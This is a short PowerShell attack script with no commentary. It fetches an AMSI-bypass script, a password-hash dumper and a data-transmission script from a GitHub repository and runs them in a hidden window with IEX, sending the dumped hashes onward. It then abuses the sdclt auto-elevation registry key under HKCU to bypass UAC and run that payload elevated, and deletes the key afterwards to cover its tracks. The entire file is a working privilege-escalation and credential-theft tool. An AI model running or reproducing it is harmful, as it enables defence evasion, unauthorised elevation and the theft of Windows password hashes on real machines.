$program = "powershell -windowstyle hidden $a=((wget 'https://raw.githubusercontent.com/mo-tec/HashExtractor/master/AMSI-Bypass.ps1').Content);IEX $a;$b=((wget 'https://raw.githubusercontent.com/mo-tec/HashExtractor/master/Get-PassHashes.ps1').Content);$c=((wget 'https://raw.githubusercontent.com/mo-tec/HashExtractor/master/Invoke-Transmission.ps1').Content);IEX $b;IEX $c;Get-PassHashes | Out-String | Invoke-Transmission -ip localhost"
#$program = "powershell"
New-Item "HKCU:\Software\Classes\Folder\shell\open\command" -Force -Value $program
New-ItemProperty -Path "HKCU:\Software\Classes\Folder\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
start sdclt
Sleep 2
Remove-Item "HKCU:\Software\Classes\Folder\shell\open\command" -Force